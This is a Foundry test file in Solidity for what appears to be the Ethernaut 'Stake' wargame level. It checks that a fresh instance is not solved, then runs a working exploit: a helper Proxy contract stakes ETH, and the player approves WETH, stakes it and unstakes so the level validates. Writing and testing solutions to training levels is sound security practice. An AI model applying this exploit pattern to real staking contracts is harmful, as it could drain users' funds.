pragma solidity 0.8.11;

import "src/levels/Stake/Stake.sol";
import "src/levels/Stake/StakeFactory.sol";
import "forge-std/Test.sol";
import "src/openzeppelin-contracts-08/token/ERC20/ERC20.sol";

import {console} from "forge-std/console.sol";

contract StakeAttackTest is Test {
    address public dummyPlayerAddress = 0x30d2554d48037F642f095F24098319481A6D6642;
    StakeFactory public factory;
    Stake public instance;

    function setUp() public {
        factory = new StakeFactory();
        instance = Stake(factory.createInstance(dummyPlayerAddress));
    }

    function test_ShouldNotBeImmediatelySolvable() public {
        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), false);
    }

    function test_ShouldAllowThePlayerToSolveTheLevel() public {
        vm.startPrank(dummyPlayerAddress);

        vm.deal(dummyPlayerAddress,  0.002 ether);
        Proxy proxy = new Proxy();
        ERC20 dweth = ERC20(instance.WETH());

        proxy.call{value: 0.001 ether + 2}(address(instance), abi.encodeWithSelector(instance.StakeETH.selector));

        dweth.approve(address(instance), type(uint256).max);
        instance.StakeWETH( 0.001 ether + 1);
        instance.Unstake(instance.UserStake(dummyPlayerAddress));

        assertEq(factory.validateInstance(payable(address(instance)), dummyPlayerAddress), true);
    }
}

contract Proxy {
    function call(address target, bytes memory data) public payable returns (bool, bytes memory) {
        (bool success, bytes memory result) = target.call{value: msg.value}(data);
        require(success, "Call failed");
        return (success, result);
    }
}
